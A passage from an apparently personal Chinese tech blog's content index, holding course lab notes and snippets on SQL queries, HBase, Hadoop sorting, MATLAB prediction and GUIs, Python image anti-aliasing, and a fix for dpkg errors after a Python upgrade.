src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image032.jpg" alt="img"></p><p>9.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select name,score from students;</code></pre><p>查询students表中所有学生的姓名、分数，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image034.jpg" alt="img"></p><p>10.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> select * from students where score>=80 and score<=90;</code></pre><p>查询students表中成绩在80至90之间的记录的所有信息，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image036.jpg" alt="img"></p><p>11.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> select name,course_id,score from students where score<60;</code></pre><p>查询students表中成绩在60以下的记录的姓名、课程编号（course_id）和分数，查询结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image038.jpg" alt="img"></p><p>12.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> select * from students order by score desc,name asc;</code></pre><p>将students表中的所有记录先按分数降序，当分数一样时，再按姓名升序排列，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image040.jpg" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image042.jpg" alt="img"></p><p>13.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select count(distinct course_id) from students;</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image044.jpg" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image046.jpg" alt="img"></p><p>14.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> select course_id,score from students where name=='Mary';</code></pre><p>查询Mary所选修课程的课程编号和分数，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image048.jpg" alt="img"></p><p>15.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> select name,score,course_id,classes from students a,(select max(score) max_score from students where course_id=30) b where a.score=b.max_score and course_id=30;</code></pre><p>找出所有学生中，course_id为30的课程，分数最高的同学。输出该同学姓名、分数、 课程名称、所在班级到屏幕，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image050.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux版python升级依赖项问题</title>
      <link href="2020/06/15/linux-ban-python-sheng-ji-yi-lai-xiang-wen-ti/"/>
      <url>2020/06/15/linux-ban-python-sheng-ji-yi-lai-xiang-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>linux中python2升级到python3，会出现一系列的依赖项未配置问题，如果不解决，将会影响其他环境的安装配置。 </p><p>比如python2升级到3之后，安装docker就会出现(<strong>大量文字高能警告，可以忽略跳到后面</strong>)</p><p><code>正在读取软件包列表... 完成正在分析软件包的依赖关系树       正在读取状态信息... 完成       python-pkg-resources 已经是最新版 (33.1.1-1)。python-pkg-resources 已设置为手动安装。升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 1 个软件包未被升级。有 15 个软件包没有被完全安装或卸载。解压缩后会消耗 0 B 的额外空间。您希望继续执行吗？ [Y/n] y正在设置 python-idna (2.2-1) .../var/lib/dpkg/info/python-idna.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-idna (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-pyasn1 (0.1.9-2) .../var/lib/dpkg/info/python-pyasn1.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-pyasn1 (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-wheel (0.29.0-2) .../var/lib/dpkg/info/python-wheel.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-wheel (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-pkg-resources (33.1.1-1) .../var/lib/dpkg/info/python-pkg-resources.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-pkg-resources (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-keyrings.alt (1.3-1) .../var/lib/dpkg/info/python-keyrings.alt.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-keyrings.alt (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-six (1.10.0-3) .../var/lib/dpkg/info/python-six.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-six (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126正在设置 python-enum34 (1.1.6-1) .../var/lib/dpkg/info/python-enum34.postinst: /usr/bin/pycompile: /usr/bin/python: 解释器错误: 没有那个文件或目录dpkg: 处理软件包 python-enum34 (--configure)时出错： 子进程 已安装 post-installation 脚本 返回错误状态 126dpkg: 依赖关系问题使得 python-cryptography 的配置工作不能继续： python-cryptography 依赖于 python-enum34；然而：  软件包 python-enum34 尚未配置。 python-cryptography 依赖于 python-idna (&gt;= 2.0)；然而：  软件包 python-idna 尚未配置。 python-cryptography 依赖于 python-pyasn1 (&gt;= 0.1.8)；然而：  软件包 python-pyasn1 尚未配置。 python-cryptograp</code></p><h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><pre class=" language-lang-shell"><code class="language-lang-shell">sudo apt-get cleansudo apt-get updatesudo apt-get install --reinstall python-minimal python-lockfile</code></pre><p>(某些情况下只执行最后一行命令也许)</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/slvayf/article/details/84336327" target="_blank" rel="noopener">Ubuntu下报错：处理软件包 python-dnspython (—configure)时出错 解决方法</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBase应用实验</title>
      <link href="2020/06/05/hbase-shi-yan/"/>
      <url>2020/06/05/hbase-shi-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该文为Hadoop课程的HBase的应用实验</p><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><p>Hbase的应用   </p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>1、掌握Hbase shell操作。</p><p>2、掌握Hbase API编程。</p><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>  用Hbase shell操作 ，调用API创建一个student表，其结构如下表所示</p><div class="table-container"><table><thead><tr><th><strong>Row Key</strong></th><th><strong>address</strong></th><th><strong>score</strong></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>province</strong></td><td><strong>city</strong></td><td><strong>street</strong></td><td><strong>Java</strong></td><td><strong>Hadoop</strong></td><td><strong>Math</strong></td><td></td></tr><tr><td><strong>zhangsan</strong></td><td><strong>guangdong</strong></td><td><strong>guangzhou</strong></td><td><strong>yinglonglu</strong></td><td><strong>85</strong></td><td><strong>80</strong></td><td><strong>90</strong></td></tr><tr><td><strong>lisi</strong></td><td><strong>guangxi</strong></td><td><strong>guilin</strong></td><td><strong>putuolu</strong></td><td><strong>87</strong></td><td><strong>82</strong></td><td><strong>78</strong></td></tr></tbody></table></div><p>查询zhangsan的地址（address）</p><p>查询 lisi 的Hadoop成绩。</p><p>二、   实验方案</p><p>（主要写Hbase shell命令 和 运用API 编写的程序及运行结果，此语句要删除）</p><p>1， 创建表student有两个列族address和score</p><pre><code>hbase(main):041:0&gt; create&#39;student&#39;, {NAME=&gt;&#39;address&#39;}, {NAME=&gt;&#39;score&#39;}</code></pre><p>2， 向表中添加数据，</p><pre><code>hbase(main):042:0&gt;put&#39;student&#39;,&#39;zhangsan&#39;,&#39;address:province&#39;,&#39;guangdon&#39;hbase(main):043:0&gt;put&#39;student&#39;, &#39;zhangsan&#39;,&#39;address:city&#39;,&#39;guangzhou&#39;hbase(main):044:0&gt;put&#39;student&#39;,&#39;zhangsan&#39;,&#39;address:street&#39;,&#39;yinglonglu&#39;hbase(main):045:0&gt;put&#39;student&#39;,&#39;zhangsan&#39;,&#39;score:Java&#39;,&#39;85&#39; hbase(main):046:0&gt;put&#39;student&#39;,&#39;zhangsan&#39;,&#39;score:Hadoop&#39;,&#39;80&#39;hbase(main):047:0&gt;put&#39;student&#39;, &#39;zhangsan&#39;,&#39;score:Math&#39;,&#39;90&#39;hbase(main):048:0&gt;put&#39;student&#39;, &#39;lisi&#39;,&#39;address:province&#39;,&#39;guangxi&#39;hbase(main):049:0&gt;put&#39;student&#39;, &#39;lisi&#39;,&#39;address:city&#39;,&#39;guilin&#39;hbase(main):050:0&gt;put&#39;student&#39;,&#39;lisi&#39;,&#39;address:street&#39;,&#39;putuolu&#39;hbase(main):051:0&gt;put&#39;student&#39;,&#39;lisi&#39;,&#39;score:Java&#39;,&#39;87&#39;hbase(main):052:0&gt;put&#39;student&#39;,&#39;lisi&#39;,&#39;score:Hadoop&#39;,&#39;82&#39;53hbase(main):053:0&gt;put&#39;student&#39;,&#39;lisi&#39;,&#39;score:Math&#39;,&#39;78&#39;</code></pre><ol><li>查询“zhangsan”的地址（address）</li></ol><pre><code>hbase(main):054:0&gt; get&#39;student&#39;,&#39;zhangsan&#39;,’address’ COLUMN          CELL                                  \1.  adress:province       timestamp=1478053832459, value=guangdong                   \2.  adress:city        timestamp=1478053787178, value=guangzhou  \3.    adress:street       timestamp=1478053764968, value=yinglonglu</code></pre><p> 4.查询“lisi”的“Hadoop”成绩</p><pre><code>hbase(main):055:0&gt; get&#39;student&#39;,&#39;lisi&#39;,’ &#39;score:Hadoop&#39;’//创建表描述对象​    HTableDescriptor TableDescriptor = new HTableDescriptor(tableName);   //通过表描述对象，添加列簇   hTableDescriptor columnDesc1=new HColumnDescriptor(&quot;address &quot;);hTableDescriptor columnDesc1=new HColumnDescriptor(&quot;score&quot;);   //通过admin创建表，需要传入表描述对象   admin.createTable(hTableDescriptor);   System.out.println(&quot;创建表&quot;);public void initConnection() {  try{   connection = ConnectionFactory.createConnection(config);  } catch (IOException e) {   System.out.println(&quot;连接数据库&quot;);  }}public void put() throws IOException {  //1. 定义表的名称  TableName tableName = TableName.valueOf(&quot;student&quot;);  //2. 获取表对象  Table table = connection.getTable(tableName);  //3. 准备数据  String rowkey = &quot;rowkey_zhangsan&quot;;  Put put= new Put(Bytes.toBytes(rowKey));​    put.addColumn(Bytes.toBytes(&quot;address&quot;), Bytes.toBytes(&quot;province&quot;), Bytes.toBytes(&quot;guangdong&quot;));​    put.addColumn(Bytes.toBytes(&quot;address &quot;), Bytes.toBytes(&quot;city&quot;), Bytes.toBytes(&quot;guangzhou&quot;));​    put.addColumn(Bytes.toBytes(&quot;address &quot;), Bytes.toBytes(&quot;street&quot;), Bytes.toBytes(&quot;putuolu&quot;));​    put.addColumn(Bytes.toBytes(&quot;score&quot;), Bytes.toBytes(&quot;Java&quot;), Bytes.toBytes(&quot;87&quot;));put.addColumn(Bytes.toBytes(&quot;score&quot;),Bytes.toBytes(&quot;Hadoop&quot;), Bytes.toBytes(&quot;82&quot;));put.addColumn(Bytes.toBytes(&quot;score&quot;),Bytes.toBytes(&quot;Math&quot;), Bytes.toBytes(&quot;78&quot;));String rowkey = &quot;rowkey_lisi&quot;;  Put put= new Put(Bytes.toBytes(rowKey));​    put.addColumn(Bytes.toBytes(&quot;address&quot;), Bytes.toBytes(&quot;province&quot;), Bytes.toBytes(&quot;guangxi&quot;));​    put.addColumn(Bytes.toBytes(&quot;address &quot;), Bytes.toBytes(&quot;city&quot;), Bytes.toBytes(&quot;guilin&quot;));​    put.addColumn(Bytes.toBytes(&quot;address &quot;), Bytes.toBytes(&quot;street&quot;), Bytes.toBytes(&quot;yinglonglu&quot;));​    put.addColumn(Bytes.toBytes(&quot;score&quot;), Bytes.toBytes(&quot;Java&quot;), Bytes.toBytes(&quot;85&quot;));put.addColumn(Bytes.toBytes(&quot;score&quot;),Bytes.toBytes(&quot;Hadoop&quot;), Bytes.toBytes(&quot;80&quot;));put.addColumn(Bytes.toBytes(&quot;score&quot;),Bytes.toBytes(&quot;Math&quot;), Bytes.toBytes(&quot;90&quot;));</code></pre><p> // 4. 添加数据</p><pre class=" language-lang-java"><code class="language-lang-java">    table.put(put);    table.close();</code></pre><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>因吹斯汀</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/weixin_42641909/article/details/89445045" target="_blank" rel="noopener">HBase Java API、连接HBase、创建表、添加数据put、获取数据get、全表扫描scan 06 : 啊策策</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab的GUI界面</title>
      <link href="2020/06/03/matlab-de-gui-jie-mian/"/>
      <url>2020/06/03/matlab-de-gui-jie-mian/</url>
      
        <content type="html"><![CDATA[<p>现在matlab把程序打包成APP基本上用matlab app designer啦，比较少用matlab gui。放心，就设计原理和使用来说我感觉跟QT designer还是很像的，所以上手还是挺简单的（对于了解过QT的人来说。。。）但是因为我在这方面仅仅是用过，而且因为时间太久了，所以也实在没什么笔记，如果需要学习/复习建议官方文档吧！（matlab的官方文档基本上都讲得很清晰明了）</p><h1 id="App-构建"><a href="#App-构建" class="headerlink" title="App 构建"></a>App 构建</h1><p>使用 App 设计工具、编程工作流或 GUIDE 进行 App 开发</p><p>App 是自包含式 MATLAB® 程序，可为您的代码提供一个简单的点选式接口。App 包含交互式控件，例如菜单、按钮和滑块，当用户与这些控件交互时它们将执行特定的指令。App 也可以包含用于数据可视化或交互式数据探查的绘图。将您的 App 打包并与其他 MATLAB 用户共享，或者使用 MATLAB Compiler™ 以独立应用程序形式分发您的 App。</p><p>下表总结了构建 App 的不同方法。要进行完整比较，请参阅<a href="https://ww2.mathworks.cn/help/matlab/creating_guis/ways-to-build-matlab-guis.html" target="_blank" rel="noopener">构建 App 的方法</a>。</p><div class="table-container"><table><thead><tr><th style="text-align:left">App 构建方法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">App 设计工具</td><td style="text-align:left">App 设计工具是在 MATLAB 中构建 App 的推荐环境，它是 GUIDE 开发环境的替代工具。App 设计工具是一个功能丰富的开发环境，它提供大量交互式组件、稳健的编程工作流、布局管理器和自动调整布局等选项，使您的 App 能够响应屏幕大小的变化。如果您有 MATLAB Compiler，则可以使用 App 设计工具创建 Web App。</td></tr><tr><td style="text-align:left">编程工作流</td><td style="text-align:left">在此方法中，使用 MATLAB 函数创建一个传统图窗，并以编程方式在该图窗中放置交互式组件。</td></tr><tr><td style="text-align:left">GUIDE（不推荐）</td><td style="text-align:left">不建议使用 GUIDE 拖放式环境，它已被 App 设计工具取代，并将在以后的版本中删除。删除 GUIDE 后，使用 GUIDE 创建的现有 App 仍可继续在 MATLAB 中运行，但无法使用 GUIDE 环境进行编辑。要继续编辑使用 GUIDE 创建的现有 App，请参阅<a href="https://ww2.mathworks.cn/help/matlab/creating_guis/differences-between-app-designer-and-guide.html" target="_blank" rel="noopener">GUIDE 迁移策略</a>，了解有关如何维护 GUIDE 与将来的 MATLAB 版本兼容的信息。要创建新 App，请使用 App 设计工具。</td></tr></tbody></table></div><ul><li><strong><a href="https://ww2.mathworks.cn/help/matlab/app-designer.html" target="_blank" rel="noopener">App 设计工具</a></strong><br>使用 App 设计工具开发 App</li><li><strong><a href="https://ww2.mathworks.cn/help/matlab/guide-or-matlab-functions.html" target="_blank" rel="noopener">GUIDE 或编程工作流</a></strong><br>使用编程工作流或 GUIDE 开发 App</li><li><strong><a href="https://ww2.mathworks.cn/help/matlab/packaging-guis-as-apps.html" target="_blank" rel="noopener">打包和共享 App</a></strong><br>直接与 MATLAB 用户共享 App，或打包并作为独立 App 共享</li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像去锯齿(降噪、插值、缩略三连)</title>
      <link href="2020/05/21/tu-xiang-qu-ju-chi-jiang-zao-cha-zhi/"/>
      <url>2020/05/21/tu-xiang-qu-ju-chi-jiang-zao-cha-zhi/</url>
      
        <content type="html"><![CDATA[<p> 图像预处理算法的好坏直接关系到后续图像处理的效果，如图像分割、目标识别、边缘提取等，为了获取高质量的数字图像，很多时候都需要对图像进行降噪处理，尽可能的保持原始信息完整性（即主要特征）的同时，又能够去除信号中无用的信息。 </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705234702375.png" alt="鲁迅：我没说过"></p><p>如果图片有大量的锯齿难免会显得拙糙，那么这时候降噪也不是一种去除锯齿的好方法。 </p><p>例如：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20230f5dd0c4d285330a78cee1bbe5f.jpg" alt="带锯齿的原图"></p><p>用该方法去除锯齿之后：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/PIL_Image6.png" alt="经过高斯模糊之后的图像"></p><pre class=" language-lang-python"><code class="language-lang-python">import cv2import numpy as npimg_path = ("1.png")        #获取图片路径img = Image.open(img_path)    img_sp = cv2.imread(img_path)    sp = img_sp.shape            #读取图片长宽#第一次插值、降噪img = img.resize((sp[1]*2, sp[0]*2), Image.BILINEAR)        #三次样条插值，图像长宽放大为2倍img = np.array(img)img_gaosi=cv2.GaussianBlur(img,(5,5),0)                        #高斯降噪，设置高斯核img = Image.fromarray(img_gaosi)                            #转换回数组，以便numpy可读取img = img.resize((sp[1]*2, sp[0]*2), Image.ANTIALIAS)        #保持图像品质缩略#第二次插值、降噪img = img.resize((sp[1]*4, sp[0]*4), Image.BILINEAR)       #三次样条插值，图像长宽放大为4倍img = np.array(img)img_gaosi=cv2.GaussianBlur(img,(5,5),0)img = Image.fromarray(img_gaosi)img = img.resize((sp[1]*4, sp[0]*4), Image.ANTIALIAS)#第三次插值、降噪img = img.resize((sp[1]*16, sp[0]*16), Image.BILINEAR)        #三次样条插值，图像长宽放大为16倍img = np.array(img)img_gaosi=cv2.GaussianBlur(img,(5,5),0)img = Image.fromarray(img_gaosi)        img = img.resize((sp[1]*16, sp[0]*16), Image.ANTIALIAS)</code></pre><p>注：示例图片来自<a href="https://www.hanspub.org/journal/PaperInformation.aspx?paperID=36204" target="_blank" rel="noopener">《应用数学进展》</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hadoop简单排序</title>
      <link href="2020/05/15/hadoop-jian-dan-pai-xu/"/>
      <url>2020/05/15/hadoop-jian-dan-pai-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该文为Hadoop课程的简单排序实现</p><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><p> 简单排序的实现   </p><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>掌握使用MapReduce对数据进行排序的方法。</p><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>以下四个txt文件其各有6个数值</p><p>s1.txt：</p><p>35 12345 21 5 -8 365</p><p>s2.txt:</p><p>38 156 12 6 -2 -10</p><p>s3.txt:</p><p>45 2365 68 -15 -18 -30</p><p>编写一个简单排序的程序，如果将上面三个文件作为输入，则排序后的输出结果为。</p><p>序号 数值 （从小到大）</p><h2 id="实验方案"><a href="#实验方案" class="headerlink" title="实验方案"></a>实验方案</h2><p>在MapReduce过程中就有排序,它的默认排序规则按照key值进行排序的，如果key为封装int的IntWritable类型，那么MapReduce按照数字大小对key排序，如果key为封装为String的Text类型，那么MapReduce按照字典顺序对字符串排序。我们可以使用封装int的IntWritable型数据结构。也就是在map中将读入的数据转化成IntWritable型，然后作为key值输出（value任意）。reduce拿到<key，value-list>之后，将输入的key作为value输出，并根据value-list中元素的个数决定输出的次数。输出的key（即代码中的linenum）是一个全局变量，它统计当前key的位次。</p><p>在示例代码中，需要将其分为Map和Reduce两部分来作修改。在Map部分中，“Text”需要改成“IntWritable”；“itr.nextToken()”需要改成“Integer.parseInt(itr.nextToken())”。在Reduce部分中，“Text”需要改成“IntWritable”；“IntWritable()”需要改成“IntWritable(1)”；for循环语句需要删除；“job.setCombinerClass(IntSumReducer.class);”和“result.set(sum)”这两段语句也需要删除；“word”和“one”则需要对调位置。</p><p>下面是经过修改之后的代码：</p><pre class=" language-lang-java"><code class="language-lang-java">import java.io.IOException;import java.util.StringTokenizer;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;import org.apache.hadoop.util.GenericOptionsParser;public class WordCount { public static class TokenizerMapper ​    extends Mapper<Object, IntWritable, IntWritable, IntWritable>{  private final static IntWritable one = new IntWritable(1);  private IntWritable word = new IntWritable(1);  public void map(Object key, IntWritable value, Context context​          ) throws IOException, InterruptedException {   StringTokenizer itr = new StringTokenizer(value.toString());   while (itr.hasMoreTokens()) {​    word.set(Integer.parseInt(itr.nextToken()));​    context.write(one, word);   }  } } public static class IntSumReducer ​    extends Reducer<IntWritable,IntWritable,IntWritable,IntWritable> {  private IntWritable result = new IntWritable(1);  public void reduce(IntWritable key, Iterable<IntWritable> values, ​            Context context​            ) throws IOException, InterruptedException {   int sum = 0;   context.write(key, result);  } } public static void main(String[] args) throws Exception {  Configuration conf = new Configuration();  String[] otherArgs = new GenericOptionsParser(conf, args).getRemainingArgs();  if (otherArgs.length < 2) {   System.err.println("Usage: wordcount <in> [<in>...] <out>");   System.exit(2);  }  Job job = new Job(conf, "word count");  job.setJarByClass(WordCount.class);  job.setMapperClass(TokenizerMapper.class);  job.setReducerClass(IntSumReducer.class);  job.setOutputKeyClass(IntWritable.class);  job.setOutputValueClass(IntWritable.class);  for (int i = 0; i < otherArgs.length - 1; ++i) {   FileInputFormat.addInputPath(job, new Path(otherArgs[i]));  }  FileOutputFormat.setOutputPath(job,   new Path(otherArgs[otherArgs.length - 1]));  System.exit(job.waitForCompletion(true) ? 0 : 1); }}</code></pre><p>在输入代码前，需要新建MapReduce项目并新建一个类，类名需要与代码相对应，即是WordCount。输入完上述代码过后，需要修改这个类的输入输出路径，即是在argument窗口中，将路径设置为用于存储需要排序的数据的文件。然后再运行代码，即可得到实验题目中所给出的排序结果（如“三、结论”中的插图所示）。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>本次实验的目的与要求均已达成。在实验中，可以熟练利用现成的虚拟机资源在VM上创建Master虚拟机及其slave虚拟机集群。基本能够运用MapReduce将数据从三个不同文件中提取出来并按照其自身的key值进行有小到大的排序，得到题目中给出的实验结果（下图即是代码运行后的到的结果）</p><p>​         <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002.png" alt="Hadoop简单排序结果">  </p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的三种机器学习预测方法</title>
      <link href="2020/05/06/chang-yong-de-san-chong-ji-qi-xue-xi-yu-ce-fang-fa/"/>
      <url>2020/05/06/chang-yong-de-san-chong-ji-qi-xue-xi-yu-ce-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>以下代码统一为读入xlsx文件，其中第一列为因变量，其余列为自变量,每一行代表一个样本</p><h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><pre class=" language-lang-matlab"><code class="language-lang-matlab">%读取数据[X,TXT,RAW]=xlsread('train_element.xlsx');y=X(:,1);        %第一列为y值X(:,1)=[1];      %将第一列数值变为1[b,bint,r,rint,stats]=regress(y,X);b   %回归系数，第一个是常数项%测试[TX,TXT,RAW]=xlsread('test_element.xlsx');TY_num = size(TX,1);TY = [1:TY_num];TY(1,:) = b(1);for i = 1:30            %测试数据30行    for j = 1:21       %每一行21个自变量        TY(i) = TX(i,j+1) * b(j+1)+TY(i); % TX第一个是1，故j+1;b第一个是常数项系数，故j+1      end  endhold onplot(TY)plot(TX(:,1))legend('预测值','真实值');TY</code></pre><h2 id="BP网络"><a href="#BP网络" class="headerlink" title="BP网络"></a>BP网络</h2><p>在应用程序处打开<code>Neural Net Fitting</code>训练神经网络模型</p><p>参见 (如何利用matlab做BP神经网络分析-利用matlab神经网络工具箱)[ <a href="https://blog.csdn.net/ljyljyok/article/details/81362465" target="_blank" rel="noopener">https://blog.csdn.net/ljyljyok/article/details/81362465</a> ]</p><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [ ] = BP_Forecast( X,TX )load BP_202054_14.mat         %导入网络模型X = X';                     %转置Y=sim(net,X);         %使用训练好的BP网络模型预测</code></pre><h2 id="SVM"><a href="#SVM" class="headerlink" title="SVM"></a>SVM</h2><pre class=" language-lang-matlab"><code class="language-lang-matlab">function [ ] = SVM_R( X,TX )%load svm_r            %若没有数据则读取模型%[X,TXT,RAW]=xlsread('train_element.xlsx');      %读取训练数据target = X(:,1);X(:,1) = [];train = X;%% 最优参数选择mse = 10^7;for log2c = -10:0.5:3    for log2g = -10:0.5:3        % -v 交叉验证参数：在训练的时候需要，测试的时候不需要，否则出错        options = ['-v 3 -c ', num2str(2^log2c), ' -g ', num2str(2^log2g) , ' -s 3 -p 0.4 -t 3'];        cv = svmtrain(target,train,options);        if (cv < mse)            mse = cv; bestc = 2^log2c; bestg = 2^log2g;        end    endend%%  训练options = ['-c ', num2str(2^bestc), ' -g ', num2str(2^bestg) , ' -s 3 -p 0.4 -n 0.1'];model = svmtrain(target,train,options)% model% 利用建立的模型看其在训练集合上的回归效果[predict_p,accuracy,dv] = svmpredict(target,train,model);figureplot(target,'o')hold onplot(predict_p,'.')test_target = TX(:,1); %这个随便给不影响预测的结果，但是会基于这个值计算预测准确率TX(:,1)=[];test_train = TX;global dv_t[predict_t,accuracy_t,dv_t] = svmpredict(test_target,test_train,model);hold onplot(predict_t,'*')legend('原始数据','回归数据','新数据预测');%直观对比%hold on%plot(TY)%plot(dv_t)%legend('原始数据','新数据预测');hold onplot(test_target)plot(dv_t)xlswrite('预测结果.xlsx',dv_t)legend('原始数据','新数据预测');</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像一维化</title>
      <link href="2020/05/06/tu-xiang-yi-wei-du-hua/"/>
      <url>2020/05/06/tu-xiang-yi-wei-du-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="灰度图像一维化"><a href="#灰度图像一维化" class="headerlink" title="灰度图像一维化"></a>灰度图像一维化</h2><p><del>众所周知</del> 灰度图像是由元素数值在 [0,255] 范围内的矩阵构成的，因此可以将一个n<em>m的矩阵（分辨率n</em>m）变成一个向量，即图像一维化。<br>常见的彩色图像由RGB三个通道组成（即有3个m*n的矩阵），因而操作其实也是类似的，三个通道分别处理再叠加即可。</p><h3 id="直接拉伸"><a href="#直接拉伸" class="headerlink" title="直接拉伸"></a>直接拉伸</h3><p>在图像处理中，有时候需要将图像拉抻成向量进行处理。</p><pre class=" language-lang-matlab"><code class="language-lang-matlab">file_path = 'D:\Documents\Project\clustering\Semi_Supervised\data\COVID_CT\CT_COVID\';% 需要一维化图像的文件夹路径 img_path_list = dir(strcat(file_path,'*.png'));%获取该文件夹中所有jpeg格式的图像img_num = length(img_path_list);%获取图像总数量data=zeros(img_num,600);             %创建零矩阵，大小为img_num*600，600自己按需修改I=cell(1,img_num);if img_num > 0 %有满足条件的图像            for j = 1:img_num %逐一读取图像                  image_name = img_path_list(j).name;% 图像名 ?                 image = imread(strcat(file_path,image_name));                  I{j}=image;                 fprintf('%d %d %s\n',1i,j,strcat(file_path,image_name));% 显示正在处理的图像名                 %图像处理过程                 % image_gray = rgb2gray(image);        %将RGB图像转换成灰度图                 image=imresize(image,[600,600],'nearest');   %调整图像大小为160×160                 